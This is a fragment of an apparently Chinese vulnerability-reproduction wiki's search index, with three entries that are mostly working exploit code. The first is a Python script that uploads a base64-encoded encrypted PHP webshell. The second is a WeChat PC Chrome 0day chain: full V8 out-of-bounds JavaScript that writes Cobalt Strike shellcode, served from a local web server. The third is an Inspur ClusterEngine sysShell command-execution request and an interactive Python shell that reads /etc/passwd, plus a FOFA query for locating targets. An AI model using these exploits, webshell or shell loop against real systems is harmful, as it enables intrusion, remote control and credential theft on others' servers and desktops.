'+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\" , \"Content-Type\" : \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64 . b64decode ( \"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJwZWlxaS5waHAiCkNvbnRlbnQtVHlwZTogaW1hZ2UvYXZpZgoKPD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwoJZWNobyAibm9fc2hlbGwiOwogICAgJGtleT0iZWRmNmJkNWNjMDBiYmM3NiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlmY0tSbHRHdi0t\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"Requst\" in response . text and response . status_code == 200 : webshell_url = target_url + \"/Upload/test/config.php\" response = requests . get ( url = webshell_url , headers = headers , verify = False , timeout = 5 ) if \"shell\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u4e0a\u4f20\u51b0\u874e\u6728\u9a6c config.php \\n [o] \u8def\u5f84\u4e3a {} /Upload/test/config.php \\033 [0m\" . format ( target_url , target_url )) print ( \" \\033 [32m[o] \u5bc6\u7801\u4e3a: PeiQi_webshell \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u4e0a\u4f20\u5931\u8d25 \\033 [0m\" ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/","text":"WX\u5229\u7528Chrome 0day\u4e0a\u7ebfCS \u00b6 Created by: Feng chen Created time: Apr 18, 2021 8:50 AM Last edited time: Apr 18, 2021 2:30 PM Tags: chrome, \u5fae\u4fe1 \u4e00\u3001 \u7b80\u4ecb \u00b6 \u672c\u6b21\u6f0f\u6d1e\u95ee\u9898\u51fa\u73b0\u70b9\u4e3a\u5fae\u4fe1\u5185\u7f6echrome\u5185\u6838\u6d4f\u89c8\u5668\uff0c\u5185\u6838\u7248\u672c\u8f83\u4f4e\uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u6c99\u76d2\u3002\u7531\u4e8e\u524d\u51e0\u5929chrome\u4e5f\u7206\u51fa\u67650day\u4e86\uff0c\u800c\u5fae\u4fe1\u6253\u5f00\u94fe\u63a5\u65f6\uff0c\u81ea\u5e26\u7684\u6d4f\u89c8\u5668\u4f1a\u8c03\u7528 chrome \u5185\u6838\uff0c\u9ed8\u8ba4\u4f7f\u7528 \u2013no-sandbox\uff0c\u6240\u4ee5\u8bbf\u95ee\u5e26\u6709\u6076\u610fjs\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u9020\u6210RCE\u3002 \u5f71\u54cd\u7248\u672c \u5fae\u4fe1 PC\uff08Windows\uff09< 3.2.1.141 \u5b98\u65b9\u94fe\u63a5\u4e0b\u8f7d\u66f4\u65b0\u6700\u65b0 (Windows \u5fae\u4fe1 PC 3.2.1.143 \u7248\u672c) https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe \u4e8c\u3001 CS \u5f00\u542fstager\u76d1\u542c\uff0c\u5e76\u751f\u6210C\u8bed\u8a00\u7684 shellcode \u00b6 \u4f7f\u7528cs\u5f00\u542f\u76d1\u542c\uff0c\u76ee\u524d\u4eb2\u6d4b\u4f7f\u7528\u672c\u5730ip\u5f00\u542f\u76d1\u542c\u6709\u6548\uff0c\u800c\u4f7f\u7528\u57df\u524d\u7f6e\u65b9\u6cd5\u751f\u6210shellcode\u65e0\u6548\uff0c\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u77e5\u9053\uff0c\u9700\u8981\u7ee7\u7eed\u7814\u7a76\u7814\u7a76\u3002 \u751f\u6210payload.c\u5982\u4e0b\uff1a \u4e09\u3001\u683c\u5f0f\u8f6c\u6362 \u00b6 \u7531\u4e8e\u811a\u672c\u4ee3\u7801\u7684\u95ee\u9898\uff0c\u9700\u8981\u5c06 shellcode \u4e2d\u7684\u659c\u6760\" \\ \"\u66ff\u6362\u4e3a\" ,0 \"\uff0c\u5e76\u4e14\u5220\u9664\u7b2c\u4e00\u4e2a\u9017\u53f7\uff0c\u7136\u540e\u653e\u5165 wechat.js \u4e2d \u56db\u3001\u8fdc\u7a0bWEB\u670d\u52a1\u5f00\u542f \u00b6 \u8fdc\u7a0b\u8d77\u4e00\u4e2aweb\u670d\u52a1\uff0c\u7136\u540e\u5c06wechat.html\u548cwechat.js\u653e\u5728\u540c\u4e00\u76ee\u5f55\u4e0b python - m SimpleHTTPServer 9090 \u4e94\u3001\u672c\u5730\u6d4b\u8bd5 \u00b6 \u7ed9\u81ea\u5df1\u53d1\u4e2a\u94fe\u63a5\uff0c\u7136\u540e\u70b9\u51fb\uff0c\u5c31\u53ef\u4ee5\u4e0a\u7ebf\u4e86\uff0c\u590d\u73b0\u6210\u529f\u3002 \u516d\uff1a\u6d4b\u8bd5\u4ee3\u7801 \u00b6 wechat.html < script src = \"wechat.js\" ></ script > wechat.js \u4ee3\u7801 ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [\u653e\u5165shelcode]; function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i < 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return 'c01db33f'; } function gc() { for (var i = 0; i < 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function () { return 'a' } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, 'g' // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\"this.a=0;\".repeat(tDerivedNCount)} } } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function (addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function (addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function (addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function (addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function (addr, content) { for (var i = 0; i < content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print('[*] target_function at 0x' + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print('[*] code_addr at 0x' + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try{ print(\"start running\"); trigger(); }catch(e){ print(e); } \u58f0\u660e\uff1a\u672c\u6b21\u590d\u73b0\u5747\u5728\u672c\u5730\u64cd\u4f5c\uff0c\u672a\u9020\u6210\u7f51\u7edc\u653b\u51fb\u3002\u672c\u6587\u4ec5\u4f9b\u5b66\u4e60\u4f7f\u7528\uff0c\u7531\u4e8e\u5b66\u4e60\u9020\u6210\u7684\u4e00\u5207\u540e\u679c\u672c\u4eba\u4e0d\u627f\u62c5\u4efb\u4f55\u8d23\u4efb\u3002","title":"WX\u5229\u7528Chrome 0day\u4e0a\u7ebfCS"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#wx\u5229\u7528chrome-0day\u4e0a\u7ebfcs","text":"Created by: Feng chen Created time: Apr 18, 2021 8:50 AM Last edited time: Apr 18, 2021 2:30 PM Tags: chrome, \u5fae\u4fe1","title":"WX\u5229\u7528Chrome 0day\u4e0a\u7ebfCS"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u4e00\u7b80\u4ecb","text":"\u672c\u6b21\u6f0f\u6d1e\u95ee\u9898\u51fa\u73b0\u70b9\u4e3a\u5fae\u4fe1\u5185\u7f6echrome\u5185\u6838\u6d4f\u89c8\u5668\uff0c\u5185\u6838\u7248\u672c\u8f83\u4f4e\uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u6c99\u76d2\u3002\u7531\u4e8e\u524d\u51e0\u5929chrome\u4e5f\u7206\u51fa\u67650day\u4e86\uff0c\u800c\u5fae\u4fe1\u6253\u5f00\u94fe\u63a5\u65f6\uff0c\u81ea\u5e26\u7684\u6d4f\u89c8\u5668\u4f1a\u8c03\u7528 chrome \u5185\u6838\uff0c\u9ed8\u8ba4\u4f7f\u7528 \u2013no-sandbox\uff0c\u6240\u4ee5\u8bbf\u95ee\u5e26\u6709\u6076\u610fjs\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u9020\u6210RCE\u3002 \u5f71\u54cd\u7248\u672c \u5fae\u4fe1 PC\uff08Windows\uff09< 3.2.1.141 \u5b98\u65b9\u94fe\u63a5\u4e0b\u8f7d\u66f4\u65b0\u6700\u65b0 (Windows \u5fae\u4fe1 PC 3.2.1.143 \u7248\u672c) https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe","title":"\u4e00\u3001\u7b80\u4ecb"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u4e8ccs-\u5f00\u542fstager\u76d1\u542c\u5e76\u751f\u6210c\u8bed\u8a00\u7684-shellcode","text":"\u4f7f\u7528cs\u5f00\u542f\u76d1\u542c\uff0c\u76ee\u524d\u4eb2\u6d4b\u4f7f\u7528\u672c\u5730ip\u5f00\u542f\u76d1\u542c\u6709\u6548\uff0c\u800c\u4f7f\u7528\u57df\u524d\u7f6e\u65b9\u6cd5\u751f\u6210shellcode\u65e0\u6548\uff0c\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u77e5\u9053\uff0c\u9700\u8981\u7ee7\u7eed\u7814\u7a76\u7814\u7a76\u3002 \u751f\u6210payload.c\u5982\u4e0b\uff1a","title":"\u4e8c\u3001CS \u5f00\u542fstager\u76d1\u542c\uff0c\u5e76\u751f\u6210C\u8bed\u8a00\u7684 shellcode"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u4e09\u683c\u5f0f\u8f6c\u6362","text":"\u7531\u4e8e\u811a\u672c\u4ee3\u7801\u7684\u95ee\u9898\uff0c\u9700\u8981\u5c06 shellcode \u4e2d\u7684\u659c\u6760\" \\ \"\u66ff\u6362\u4e3a\" ,0 \"\uff0c\u5e76\u4e14\u5220\u9664\u7b2c\u4e00\u4e2a\u9017\u53f7\uff0c\u7136\u540e\u653e\u5165 wechat.js \u4e2d","title":"\u4e09\u3001\u683c\u5f0f\u8f6c\u6362"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u56db\u8fdc\u7a0bweb\u670d\u52a1\u5f00\u542f","text":"\u8fdc\u7a0b\u8d77\u4e00\u4e2aweb\u670d\u52a1\uff0c\u7136\u540e\u5c06wechat.html\u548cwechat.js\u653e\u5728\u540c\u4e00\u76ee\u5f55\u4e0b python - m SimpleHTTPServer 9090","title":"\u56db\u3001\u8fdc\u7a0bWEB\u670d\u52a1\u5f00\u542f"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u4e94\u672c\u5730\u6d4b\u8bd5","text":"\u7ed9\u81ea\u5df1\u53d1\u4e2a\u94fe\u63a5\uff0c\u7136\u540e\u70b9\u51fb\uff0c\u5c31\u53ef\u4ee5\u4e0a\u7ebf\u4e86\uff0c\u590d\u73b0\u6210\u529f\u3002","title":"\u4e94\u3001\u672c\u5730\u6d4b\u8bd5"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1/WX%E5%88%A9%E7%94%A8Chrome%200day%E4%B8%8A%E7%BA%BFCS/#\u516d\u6d4b\u8bd5\u4ee3\u7801","text":"wechat.html < script src = \"wechat.js\" ></ script > wechat.js \u4ee3\u7801 ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [\u653e\u5165shelcode]; function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i < 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return 'c01db33f'; } function gc() { for (var i = 0; i < 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function () { return 'a' } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, 'g' // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\"this.a=0;\".repeat(tDerivedNCount)} } } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function (addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function (addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function (addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function (addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function (addr, content) { for (var i = 0; i < content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print('[*] target_function at 0x' + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print('[*] code_addr at 0x' + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try{ print(\"start running\"); trigger(); }catch(e){ print(e); } \u58f0\u660e\uff1a\u672c\u6b21\u590d\u73b0\u5747\u5728\u672c\u5730\u64cd\u4f5c\uff0c\u672a\u9020\u6210\u7f51\u7edc\u653b\u51fb\u3002\u672c\u6587\u4ec5\u4f9b\u5b66\u4e60\u4f7f\u7528\uff0c\u7531\u4e8e\u5b66\u4e60\u9020\u6210\u7684\u4e00\u5207\u540e\u679c\u672c\u4eba\u4e0d\u627f\u62c5\u4efb\u4f55\u8d23\u4efb\u3002","title":"\u516d\uff1a\u6d4b\u8bd5\u4ee3\u7801"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6d6a\u6f6eClusterEngineV4.0 sysShell \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6d6a\u6f6eClusterEngineV4.0 \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u53d1\u9001\u7279\u6b8a\u7684\u8bf7\u6c42\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6d6a\u6f6eClusterEngineV4.0 FOFA \u00b6 [!NOTE] title=\"TSCEV4.0\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305 POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] \u6ce8\u610f\u53c2\u6570 node \u4e2d\u7684 cu01 \u9700\u8981\u4e3ashell\u96c6\u7fa4\u4e2d\u7684\u5b58\u5728\u4e3b\u673a \u8fd9\u91cc\u53ef\u4ee5\u914d\u5408\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\u67e5\u770b\u4e3b\u673a\u540d \u6f0f\u6d1e\u5229\u7528 \u00b6 [!NOTE] \u5982\u8fc7\u51fa\u73b0 Name or service not \u8bf7\u901a\u8fc7\u4e0a\u8ff0\u7684\u65b9\u6cd5\u67e5\u770b shell\u96c6\u7fa4\u4e3b\u673a\u7684\u540d\u79f0\uff08\u811a\u672c\u9ed8\u8ba4 cu01\uff09 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: SonicWall SSL-VPN \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" , \"Cookie\" : \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /sysShell \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded; charset=UTF-8\" , \"Cookie\" : \"lang=cn\" } data = \"op=doPlease&node=cu01&command= {} \" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd ) Goby & POC \u00b6 [!NOTE] ClusterEngine V4.0 Shell cluster RCE","title":"\u6d6a\u6f6eClusterEngineV4.0 sysShell \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6d6a\u6f6eclusterenginev40-sysshell-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"\u6d6a\u6f6eClusterEngineV4.0 sysShell \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6d6a\u6f6eClusterEngineV4.0 \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u53d1\u9001\u7279\u6b8a\u7684\u8bf7\u6c42\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6d6a\u6f6eClusterEngineV4.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"TSCEV4.0\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%AA%E6%BD%AE/%E6%B5%AA%E6%BD%AEClusterEngineV4.0%20sysShell%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u8bf7\u6c42\u5305 POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] \u6ce8\u610f\u53c2\u6570 node \u4e2d\u7684 cu01 \u9700\u8981\u4e3ashell\u96c6\u7fa4\u4e2d\u7684\u5b58\u5728\u4e3b\u673a 